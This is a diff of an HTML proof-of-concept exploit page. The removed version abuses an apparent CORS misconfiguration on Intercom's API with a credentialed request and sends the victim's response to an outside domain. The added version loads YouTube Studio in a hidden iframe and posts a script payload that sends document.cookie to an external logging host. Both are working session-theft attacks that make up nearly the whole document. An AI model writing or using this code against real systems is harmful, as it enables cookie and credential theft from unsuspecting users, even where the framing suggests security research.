@@ -1,38 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Intercom CORS Exploit PoC</title>
-</head>
 <body>
-  <h1>Testing CORS Misconfiguration on Intercom</h1>
-  <pre id="output">Waiting for response...</pre>
-
   <script>
-    // Endpoint being abused
-    const url = "https://api-iam.intercom.io/messenger/web/ping";
+    // Open the vulnerable page in a hidden iframe
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'https://studio.youtube.com/channel/UCRgUzVpcO1waCrkOggRA-gw/content/promotions?d=pcd&videoId=XeVLn-RSTss&promotionEntryPoint=PROMOTION_ENTRY_POINT_CHANNEL_PAGE_VIDEOS_TAB_OVERFLOW_MENU&subid=ww-ww-xs-ip-yt_adstube_channel_page_videos!o2';
+    document.body.appendChild(iframe);
 
-    // Example POST body (minimal app_id to trigger JSON response)
-    const body = "app_id=zlmaz2pu&v=3";
-
-    fetch(url, {
-      method: "POST",
-      credentials: "include",   // include victim's cookies/session
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: body
-    })
-    .then(r => r.text())
-    .then(d => {
-      // Show stolen data in browser
-      document.getElementById("output").innerText = d;
-
-      // Exfiltrate to your GitHub server logs or another domain you control
-      fetch("https://russianyandexshop.github.io/view/log?data=" + btoa(d));
-    })
-    .catch(e => {
-      document.getElementById("output").innerText = "Error: " + e;
-    });
+    // Wait for the page to load, then inject the payload
+    iframe.onload = function() {
+      const payload = `
+        goog.loadModule(function(exports) {
+          fetch("https://06hjwc7z.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
+          return exports;
+        });
+      `;
+      iframe.contentWindow.postMessage(payload, 'https://studio.youtube.com');
+    };
   </script>
 </body>
 </html>
